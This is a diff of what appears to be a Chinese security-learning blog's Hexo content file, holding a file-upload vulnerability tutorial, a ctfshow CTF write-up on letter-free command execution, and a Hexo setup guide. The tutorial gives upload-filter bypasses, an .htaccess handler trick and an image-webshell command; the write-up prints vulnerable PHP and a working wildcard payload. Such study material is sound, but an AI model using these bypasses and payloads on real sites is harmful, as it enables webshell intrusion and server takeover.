+<h2 id="二、常见校验上传文件的方法"><a class="header-anchor" href="#二、常见校验上传文件的方法">¶</a>二、常见校验上传文件的方法</h2>
+<h3 id="客户端校验"><a class="header-anchor" href="#客户端校验">¶</a>客户端校验</h3>
+<ol>
+<li>通过javascript来校验上传文件的后缀是否合法，可以采用白名单，也可以采用黑名单的方式</li>
+<li>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</li>
+</ol>
+<p><strong>绕过方法:</strong></p>
+<ol>
+<li>禁用JS</li>
+<li>bp抓包修改后缀</li>
+</ol>
+<h3 id="服务端校验"><a class="header-anchor" href="#服务端校验">¶</a>服务端校验</h3>
+<h4 id="1-MIME类型检测"><a class="header-anchor" href="#1-MIME类型检测">¶</a>1.MIME类型检测</h4>
+<p>MIME类型是什么？</p>
+<p>在把输出结果传送到浏览器上的时候，浏览器必须启动应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。<br>
+在HTTP中，MIME类型被定义在Content-Type header中。</p>
+<p>常见的MIME类型：</p>
+<p>mine类型是描述消息内容类型的因特网标准</p>
+<p>常见的有：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;html （HTML文档）</span><br><span class="line">image&#x2F;gif （gif图像）</span><br><span class="line">text&#x2F;plain（纯文本）</span><br><span class="line">image&#x2F;png （png图像）</span><br><span class="line">application&#x2F;xml（xml）</span><br><span class="line">application&#x2F;msword （word文档）</span><br></pre></td></tr></table></figure>
+<p><strong>绕过方法：</strong></p>
+<p>通过burpsuite来修改文件的类型(Content-Type)进行过滤即可</p>
+<h4 id="2-文件内容头检测"><a class="header-anchor" href="#2-文件内容头检测">¶</a>2.文件内容头检测</h4>
+<p>通过检测文件头内容判断上传文件的合法性</p>
+<p><a href="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924145404.png"><img src="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924145404.png" alt="img"></a></p>
+<p><strong>绕过方法：</strong></p>
+<p>在恶意脚本前加上允许上传文件的头标识(比如GIF89a，会解析成gif文件)</p>
+<h4 id="3-黑名单与白名单"><a class="header-anchor" href="#3-黑名单与白名单">¶</a>3.黑名单与白名单</h4>
+<p>通过判断后缀名来确定上传文件的合法性</p>
+<p><strong>黑名单绕过方法：</strong></p>
+<ol>
+<li>
+<p>大小写绕过，例如Php、PhP</p>
+</li>
+<li>
+<p>利用黑名单中没有的，但是又能够被解析的后缀名，例如php、 php3、 php4、php5、php7、pht、phtml、phps</p>
+</li>
+<li>
+<p>配合解析利用方法，将上传的文件当作php代码执行</p>
+</li>
+<li>
+<p>使用00截断(基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候)</p>
+<p><a href="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924142619.png"><img src="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924142619.png" alt="img"></a></p>
+</li>
+<li>
+<p>超长文件名截断上传(windows 258byte | linux 4096byte)</p>
+</li>
+</ol>
+<p><strong>白名单</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">只允许上传指定后缀的文件，我们可以利用操作系统的特性来绕过。</span><br><span class="line">例如：上传文件名phpinfo.php(空格)</span><br><span class="line">                phpinfo.php(.)</span><br><span class="line">      最后生成文件时，字符会被自动去除。</span><br></pre></td></tr></table></figure>
+<p>白名单绕过方法不太好绕过，一般都是配合解析漏洞白名单</p>
+<h4 id="4-利用服务器特殊配置（Apache）"><a class="header-anchor" href="#4-利用服务器特殊配置（Apache）">¶</a>4.利用服务器特殊配置（Apache）</h4>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果在Apache中.htaccess的配置有效，且可以被上传，那可以尝试在.htaccess中写入：</span><br><span class="line">   &lt;FilesMatch &quot;phpinfo.jpg&quot;&gt;</span><br><span class="line">   SetHandler application&#x2F;x-httpd-php</span><br><span class="line">   &lt;&#x2F;FilesMatch&gt;</span><br><span class="line">   还可以</span><br><span class="line">   AddType application&#x2F;x-httpd-php .ppp</span><br><span class="line">   这样 ppp后缀文件就会转换为php</span><br><span class="line">phpinfo.jpg即可以php脚本解析</span><br></pre></td></tr></table></figure>
+<h4 id="5-图片马"><a class="header-anchor" href="#5-图片马">¶</a>5.图片马</h4>
+<p>将图片和一句话在cmd下合成后，以php脚本执行时合成的一句话也会被执行</p>
+<p>当一句话被执行时，浏览器访问时看不到一句话代码</p>
+<p><strong>制作</strong><br>
+在cmd中输入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy a.jpg&#x2F;b+a.php shell.jpg</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>web技术学习</category>
+        <category>文件上传</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>利用hexo+github搭建blog小结</title>
+    <url>/2021/01/03/%E5%AE%89%E8%A3%85hexo%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
+    <content><![CDATA[<p>想让后面用hexo+github搭建blog的兄弟们少走弯路</p>
+<a id="more"></a>
+<p><strong>先按照下面文章进行搭建,遇到具体问题再精确打击</strong></p>
+<p><a href="https://www.cnblogs.com/visugar/p/6821777.html">hexo从零开始到搭建完整</a></p>
+<h2 id="安装问题"><a class="header-anchor" href="#安装问题">¶</a>安装问题</h2>
+<h3 id="npm安装失败"><a class="header-anchor" href="#npm安装失败">¶</a>npm安装失败</h3>
+<p>修改npm的资源镜像链接:</p>
+<p><a href="https://blog.csdn.net/mmm654/article/details/106184630/">https://blog.csdn.net/mmm654/article/details/106184630/</a></p>
+<h3 id="ssh创建失败"><a class="header-anchor" href="#ssh创建失败">¶</a>ssh创建失败</h3>
+<p><strong>创建ssh 遇到</strong>  <code>Host Key Verification Failed</code><strong>参考下文解决</strong></p>
+<p><a href="https://blog.csdn.net/Zheng548/article/details/79079293">https://blog.csdn.net/Zheng548/article/details/79079293</a></p>
+<h2 id="绑定自己的域名"><a class="header-anchor" href="#绑定自己的域名">¶</a>绑定自己的域名</h2>
+<p>去阿里云购买一个域名，然后绑定到GitHub pages上。</p>
+<p>买好之后去域名控制台，选择解析</p>
+<p>如下图所示，记录值改为你的 <a href="http://username.github.io">username.github.io</a> ，然后确定。</p>
+<p><a href="https://imgchr.com/i/s9vgPK"><img src="https://s3.ax1x.com/2021/01/03/s9vgPK.png" alt="s9vgPK.png"></a></p>
+<p>然后在项目文件夹下面的source下面，比如E:\xxx\Blog\source ，新建一个文件 CNAME（注意是文件，不是文件夹） 然后用记事本打开，填写你的域名。比如我的，<a href="http://wh1tecell.com">wh1tecell.com</a></p>
+<p>再使用git bash部署一次即可</p>
+<h2 id="主题优化"><a class="header-anchor" href="#主题优化">¶</a>主题优化</h2>
+<h3 id="hexo-文章截断"><a class="header-anchor" href="#hexo-文章截断">¶</a>hexo 文章截断</h3>
+<p><a href="https://blog.csdn.net/fmk1023/article/details/100064488">https://blog.csdn.net/fmk1023/article/details/100064488</a></p>
+<h3 id="yilia主题增加分类"><a class="header-anchor" href="#yilia主题增加分类">¶</a>yilia主题增加分类</h3>
+<p><a href="https://blog.csdn.net/weixin_44330881/article/details/102825989">https://blog.csdn.net/weixin_44330881/article/details/102825989</a></p>
+<h3 id="利用不蒜子增加访问次数"><a class="header-anchor" href="#利用不蒜子增加访问次数">¶</a>利用不蒜子增加访问次数</h3>
+<p><a href="https://mxy493.xyz/2019/01/26/Hexo-yilia%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E2%80%9C%E4%B8%8D%E8%92%9C%E5%AD%90%E2%80%9D%E8%AE%BF%E9%97%AE%E9%87%8F%E7%BB%9F%E8%AE%A1/">https://mxy493.xyz/2019/01/26/Hexo-yilia主题添加“不蒜子”访问量统计/</a></p>
+<h3 id="安装Valine评论系统"><a class="header-anchor" href="#安装Valine评论系统">¶</a>安装Valine评论系统</h3>
+<p><a href="https://qinrunfa.top/archives/34257.html">https://qinrunfa.top/archives/34257.html</a></p>
+<h3 id="发现左侧-名称-和签名不显示-自行添加"><a class="header-anchor" href="#发现左侧-名称-和签名不显示-自行添加">¶</a>发现左侧 名称 和签名不显示(自行添加)</h3>
+<p><a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/issues/60">https://github.com/JoeyBling/hexo-theme-yilia-plus/issues/60</a></p>
+<h3 id="制作图标icon"><a class="header-anchor" href="#制作图标icon">¶</a>制作图标icon</h3>
+<p><a href="https://www.cnblogs.com/wangyuehan/p/10033203.html">https://www.cnblogs.com/wangyuehan/p/10033203.html</a></p>
+<h3 id="hexo-g-报错及解决方案"><a class="header-anchor" href="#hexo-g-报错及解决方案">¶</a>hexo g 报错及解决方案</h3>
+<p><a href="https://blog.csdn.net/yongf2014/article/details/50016783">https://blog.csdn.net/yongf2014/article/details/50016783</a></p>
+<p><strong>还有一些版权声明，音乐播放，图片背景等等的,慢慢耍吧 加油骚年！</strong></p>
+<p><strong>美化参考</strong>:<a href="https://blog.csdn.net/weixin_41287260/article/details/97693850">https://blog.csdn.net/weixin_41287260/article/details/97693850</a></p>
+]]></content>
+      <categories>
+        <category>前端</category>
+        <category>hexo</category>
+      </categories>
+  </entry>
+  <entry>
     <title>ssh弱口令爆破远程登录渗透过程</title>
     <url>/2020/12/19/ssh%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<p>记一次ssh弱口令爆破远程登录渗透过程</p>
@@ -2062,50 +2183,6 @@ index.php</p>
       </categories>
   </entry>
   <entry>
-    <title>利用hexo+github搭建blog小结</title>
-    <url>/2021/01/03/%E5%AE%89%E8%A3%85hexo%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
-    <content><![CDATA[<p>想让后面用hexo+github搭建blog的兄弟们少走弯路</p>
-<a id="more"></a>
-<p><strong>先按照下面文章进行搭建,遇到具体问题再精确打击</strong></p>
-<p><a href="https://www.cnblogs.com/visugar/p/6821777.html">hexo从零开始到搭建完整</a></p>
-<h2 id="安装问题"><a class="header-anchor" href="#安装问题">¶</a>安装问题</h2>
-<h3 id="npm安装失败"><a class="header-anchor" href="#npm安装失败">¶</a>npm安装失败</h3>
-<p>修改npm的资源镜像链接:</p>
-<p><a href="https://blog.csdn.net/mmm654/article/details/106184630/">https://blog.csdn.net/mmm654/article/details/106184630/</a></p>
-<h3 id="ssh创建失败"><a class="header-anchor" href="#ssh创建失败">¶</a>ssh创建失败</h3>
-<p><strong>创建ssh 遇到</strong>  <code>Host Key Verification Failed</code><strong>参考下文解决</strong></p>
-<p><a href="https://blog.csdn.net/Zheng548/article/details/79079293">https://blog.csdn.net/Zheng548/article/details/79079293</a></p>
-<h2 id="绑定自己的域名"><a class="header-anchor" href="#绑定自己的域名">¶</a>绑定自己的域名</h2>
-<p>去阿里云购买一个域名，然后绑定到GitHub pages上。</p>
-<p>买好之后去域名控制台，选择解析</p>
-<p>如下图所示，记录值改为你的 <a href="http://username.github.io">username.github.io</a> ，然后确定。</p>
-<p><a href="https://imgchr.com/i/s9vgPK"><img src="https://s3.ax1x.com/2021/01/03/s9vgPK.png" alt="s9vgPK.png"></a></p>
-<p>然后在项目文件夹下面的source下面，比如E:\xxx\Blog\source ，新建一个文件 CNAME（注意是文件，不是文件夹） 然后用记事本打开，填写你的域名。比如我的，<a href="http://wh1tecell.com">wh1tecell.com</a></p>
-<p>再使用git bash部署一次即可</p>
-<h2 id="主题优化"><a class="header-anchor" href="#主题优化">¶</a>主题优化</h2>
-<h3 id="hexo-文章截断"><a class="header-anchor" href="#hexo-文章截断">¶</a>hexo 文章截断</h3>
-<p><a href="https://blog.csdn.net/fmk1023/article/details/100064488">https://blog.csdn.net/fmk1023/article/details/100064488</a></p>
-<h3 id="yilia主题增加分类"><a class="header-anchor" href="#yilia主题增加分类">¶</a>yilia主题增加分类</h3>
-<p><a href="https://blog.csdn.net/weixin_44330881/article/details/102825989">https://blog.csdn.net/weixin_44330881/article/details/102825989</a></p>
-<h3 id="利用不蒜子增加访问次数"><a class="header-anchor" href="#利用不蒜子增加访问次数">¶</a>利用不蒜子增加访问次数</h3>
-<p><a href="https://mxy493.xyz/2019/01/26/Hexo-yilia%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0%E2%80%9C%E4%B8%8D%E8%92%9C%E5%AD%90%E2%80%9D%E8%AE%BF%E9%97%AE%E9%87%8F%E7%BB%9F%E8%AE%A1/">https://mxy493.xyz/2019/01/26/Hexo-yilia主题添加“不蒜子”访问量统计/</a></p>
-<h3 id="安装Valine评论系统"><a class="header-anchor" href="#安装Valine评论系统">¶</a>安装Valine评论系统</h3>
-<p><a href="https://qinrunfa.top/archives/34257.html">https://qinrunfa.top/archives/34257.html</a></p>
-<h3 id="发现左侧-名称-和签名不显示-自行添加"><a class="header-anchor" href="#发现左侧-名称-和签名不显示-自行添加">¶</a>发现左侧 名称 和签名不显示(自行添加)</h3>
-<p><a href="https://github.com/JoeyBling/hexo-theme-yilia-plus/issues/60">https://github.com/JoeyBling/hexo-theme-yilia-plus/issues/60</a></p>
-<h3 id="制作图标icon"><a class="header-anchor" href="#制作图标icon">¶</a>制作图标icon</h3>
-<p><a href="https://www.cnblogs.com/wangyuehan/p/10033203.html">https://www.cnblogs.com/wangyuehan/p/10033203.html</a></p>
-<h3 id="hexo-g-报错及解决方案"><a class="header-anchor" href="#hexo-g-报错及解决方案">¶</a>hexo g 报错及解决方案</h3>
-<p><a href="https://blog.csdn.net/yongf2014/article/details/50016783">https://blog.csdn.net/yongf2014/article/details/50016783</a></p>
-<p><strong>还有一些版权声明，音乐播放，图片背景等等的,慢慢耍吧 加油骚年！</strong></p>
-<p><strong>美化参考</strong>:<a href="https://blog.csdn.net/weixin_41287260/article/details/97693850">https://blog.csdn.net/weixin_41287260/article/details/97693850</a></p>
-]]></content>
-      <categories>
-        <category>前端</category>
-        <category>hexo</category>
-      </categories>
-  </entry>
-  <entry>
     <title>文件日志包含漏洞</title>
     <url>/2020/11/17/%E6%96%87%E4%BB%B6%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
     <content><![CDATA[<p>本文针对ctf中文件日志包含小结</p>
@@ -2140,126 +2217,6 @@ index.php</p>
       <categories>
         <category>web技术学习</category>
         <category>文件包含</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>文件上传漏洞</title>
-    <url>/2020/11/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>文件上传也是很常见的一种漏洞</p>
-<a id="more"></a>
-<h2 id="一、概述"><a class="header-anchor" href="#一、概述">¶</a>一、概述</h2>
-<h3 id="1-漏洞简介"><a class="header-anchor" href="#1-漏洞简介">¶</a>1.漏洞简介</h3>
-<p>文件上传，顾名思义就是上传文件的功能行为，之所以会被发展为危害严重的漏洞，是程序没有对访客提交的数据进行检验或者过滤不严，可以直接提交修改过的数据绕过扩展名的检验。文件上传漏洞是漏洞中最为简单猖獗的利用形式，一般只要能上传获取地址，可执行文件被解析就可以获取系统WebShell。</p>
-<h3 id="2-漏洞原理"><a class="header-anchor" href="#2-漏洞原理">¶</a>2.漏洞原理</h3>
-<p>网站WEB应用都有一些文件上传功能，比如文档、图片、头像、视频上传，当上传功能的实现代码没有严格校验上传文件的后缀和文件类型时，就可以上传任意文件甚至是可执行文件后门。</p>
-<h3 id="3-漏洞危害"><a class="header-anchor" href="#3-漏洞危害">¶</a>3.漏洞危害</h3>
-<p>恶意文件传递给解释器去执行，之后就可以在服务器上执行恶意代码，进行数据库执行、服务器文件管理，服务器命令执行等恶意操作。根据网站使用及可解析的程序脚本不同，可以上传的恶意脚本可以是PHP、ASP、JSP、ASPX文件。</p>
-<h2 id="二、常见校验上传文件的方法"><a class="header-anchor" href="#二、常见校验上传文件的方法">¶</a>二、常见校验上传文件的方法</h2>
-<h3 id="客户端校验"><a class="header-anchor" href="#客户端校验">¶</a>客户端校验</h3>
-<ol>
-<li>通过javascript来校验上传文件的后缀是否合法，可以采用白名单，也可以采用黑名单的方式</li>
-<li>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</li>
-</ol>
-<p><strong>绕过方法:</strong></p>
-<ol>
-<li>禁用JS</li>
-<li>bp抓包修改后缀</li>
-</ol>
-<h3 id="服务端校验"><a class="header-anchor" href="#服务端校验">¶</a>服务端校验</h3>
-<h4 id="1-MIME类型检测"><a class="header-anchor" href="#1-MIME类型检测">¶</a>1.MIME类型检测</h4>
-<p>MIME类型是什么？</p>
-<p>在把输出结果传送到浏览器上的时候，浏览器必须启动应用程序来处理这个输出文档。这可以通过多种类型MIME（多功能网际邮件扩充协议）来完成。<br>
-在HTTP中，MIME类型被定义在Content-Type header中。</p>
-<p>常见的MIME类型：</p>
-<p>mine类型是描述消息内容类型的因特网标准</p>
-<p>常见的有：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;html （HTML文档）</span><br><span class="line">image&#x2F;gif （gif图像）</span><br><span class="line">text&#x2F;plain（纯文本）</span><br><span class="line">image&#x2F;png （png图像）</span><br><span class="line">application&#x2F;xml（xml）</span><br><span class="line">application&#x2F;msword （word文档）</span><br></pre></td></tr></table></figure>
-<p><strong>绕过方法：</strong></p>
-<p>通过burpsuite来修改文件的类型(Content-Type)进行过滤即可</p>
-<h4 id="2-文件内容头检测"><a class="header-anchor" href="#2-文件内容头检测">¶</a>2.文件内容头检测</h4>
-<p>通过检测文件头内容判断上传文件的合法性</p>
-<p><a href="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924145404.png"><img src="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924145404.png" alt="img"></a></p>
-<p><strong>绕过方法：</strong></p>
-<p>在恶意脚本前加上允许上传文件的头标识(比如GIF89a，会解析成gif文件)</p>
-<h4 id="3-黑名单与白名单"><a class="header-anchor" href="#3-黑名单与白名单">¶</a>3.黑名单与白名单</h4>
-<p>通过判断后缀名来确定上传文件的合法性</p>
-<p><strong>黑名单绕过方法：</strong></p>
-<ol>
-<li>
-<p>大小写绕过，例如Php、PhP</p>
-</li>
-<li>
-<p>利用黑名单中没有的，但是又能够被解析的后缀名，例如php、 php3、 php4、php5、php7、pht、phtml、phps</p>
-</li>
-<li>
-<p>配合解析利用方法，将上传的文件当作php代码执行</p>
-</li>
-<li>
-<p>使用00截断(基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候)</p>
-<p><a href="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924142619.png"><img src="https://moonback1314.gitee.io/2019/09/10/file-upload-leak/20190924142619.png" alt="img"></a></p>
-</li>
-<li>
-<p>超长文件名截断上传(windows 258byte | linux 4096byte)</p>
-</li>
-</ol>
-<p><strong>白名单</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">只允许上传指定后缀的文件，我们可以利用操作系统的特性来绕过。</span><br><span class="line">例如：上传文件名phpinfo.php(空格)</span><br><span class="line">                phpinfo.php(.)</span><br><span class="line">      最后生成文件时，字符会被自动去除。</span><br></pre></td></tr></table></figure>
-<p>白名单绕过方法不太好绕过，一般都是配合解析漏洞白名单</p>
-<h4 id="4-利用服务器特殊配置（Apache）"><a class="header-anchor" href="#4-利用服务器特殊配置（Apache）">¶</a>4.利用服务器特殊配置（Apache）</h4>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">如果在Apache中.htaccess的配置有效，且可以被上传，那可以尝试在.htaccess中写入：</span><br><span class="line">   &lt;FilesMatch &quot;phpinfo.jpg&quot;&gt;</span><br><span class="line">   SetHandler application&#x2F;x-httpd-php</span><br><span class="line">   &lt;&#x2F;FilesMatch&gt;</span><br><span class="line">   还可以</span><br><span class="line">   AddType application&#x2F;x-httpd-php .ppp</span><br><span class="line">   这样 ppp后缀文件就会转换为php</span><br><span class="line">phpinfo.jpg即可以php脚本解析</span><br></pre></td></tr></table></figure>
-<h4 id="5-图片马"><a class="header-anchor" href="#5-图片马">¶</a>5.图片马</h4>
-<p>将图片和一句话在cmd下合成后，以php脚本执行时合成的一句话也会被执行</p>
-<p>当一句话被执行时，浏览器访问时看不到一句话代码</p>
-<p><strong>制作</strong><br>
-在cmd中输入</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy a.jpg&#x2F;b+a.php shell.jpg</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>文件上传</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>无数字字母rce</title>
-    <url>/2020/11/01/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce(ctfshow%20web%E5%85%A5%E9%97%A856)/</url>
-    <content><![CDATA[<p>面对ctfshow web入门56的学习</p>
-<a id="more"></a>
-<p><strong>我们根据这一题直接进入主题</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//web56</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    system(<span class="variable">$c</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>过滤了字母，数字。</p>
-<p>看了三位师傅的 wp才醒悟 <a href="https://www.gem-love.com/websecurity/1407.html">y1ng</a> <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神</a> <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">firebasky</a>  再次感谢三位师傅</p>
-<p><strong>先说一下这一题的解题思路：</strong></p>
-<p><strong>我们通过post一个文件(文件里面写入sh命令)，在上传的过程中，通过<code>.(点，也就是 source命令)</code>去执行执行这个文件。一般来说我们上传的文件在linux下临时保存在<code>/tmp/php??????</code>一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）</strong><br>
-**<code>注意：通过</code>.<code>去执行sh命令不需要有执行权限**</code></p>
-<p>好，接下来我已一个小白的角度分析题目所需的知识点。 首先是构造一个post文件上传，这里面也是很复杂的，参考 <a href="https://www.runoob.com/php/php-file-upload.html">PHP 文件上传 </a></p>
-<p><strong>下面就是我们构造的post文件上传数据包</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;POST数据包POC&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show&#x2F;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">&lt;!--链接是当前打开的题目链接--&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
-<p>然后直接抓包</p>
-<p><img src="https://img-blog.csdnimg.cn/20201101200259866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
-接下来构造poc命令<br>
-<code>?c=.+/???/????????[@-[]</code><br>
-用到Linux下的glob通配符：</p>
-<ul>
-<li><code>*</code>可以代替0个及以上任意字符</li>
-<li><code>?</code>可以代表1个任意字符<br>
-注：后面的<code>[@-[]</code>是linux下面的匹配符，是进行匹配的大写字母。<br>
-<img src="https://img-blog.csdnimg.cn/20201101200709838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></li>
-</ul>
-<p>介绍一下<strong>bin目录:</strong></p>
-<p>bin为binary的简写主要放置一些 <a href="http://www.2cto.com/os/">系统</a>的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等，也就是一些系统命令都在bin 目录下</p>
-<p>在这里再解释一下为什么加上#！  #!的意思是调用  /bin/sh 命令所以需要加</p>
-<p>成功遍历当前目录文件<br>
-<img src="https://img-blog.csdnimg.cn/20201101200430332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p>直接cat 得到flag</p>
-<p><img src="https://img-blog.csdnimg.cn/20201101200444686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
-<p><strong>补充</strong></p>
-<p>1.playload:?c=.+/???/???[@-[] 因为 .命令 (也就是source命令)执行需要用空格 我们用 + 绕过（也就是%20）。</p>
-<p>2.文件上传的时候 #!/bin/sh 加上 #！的意思是调用bin/sh的命令</p>
-<p>3.我们的poc的? 的数量只有11个，因为最后一个匹配为大写，用[@-[] 代替了，不需要在它的后面再加上?了</p>
-]]></content>
-      <categories>
-        <category>web技术学习</category>
-        <category>命令执行</category>
       </categories>
   </entry>
   <entry>
@@ -2328,6 +2285,49 @@ index.php</p>
       <categories>
         <category>前端</category>
         <category>docker</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>无数字字母rce</title>
+    <url>/2020/11/01/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce(ctfshow%20web%E5%85%A5%E9%97%A856)/</url>
+    <content><![CDATA[<p>面对ctfshow web入门56的学习</p>
+<a id="more"></a>
+<p><strong>我们根据这一题直接进入主题</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//web56</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    system(<span class="variable">$c</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了字母，数字。</p>
+<p>看了三位师傅的 wp才醒悟 <a href="https://www.gem-love.com/websecurity/1407.html">y1ng</a> <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">P神</a> <a href="https://blog.csdn.net/qq_46091464/article/details/108513145">firebasky</a>  再次感谢三位师傅</p>
+<p><strong>先说一下这一题的解题思路：</strong></p>
+<p><strong>我们通过post一个文件(文件里面写入sh命令)，在上传的过程中，通过<code>.(点，也就是 source命令)</code>去执行执行这个文件。一般来说我们上传的文件在linux下临时保存在<code>/tmp/php??????</code>一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）</strong><br>
+**<code>注意：通过</code>.<code>去执行sh命令不需要有执行权限**</code></p>
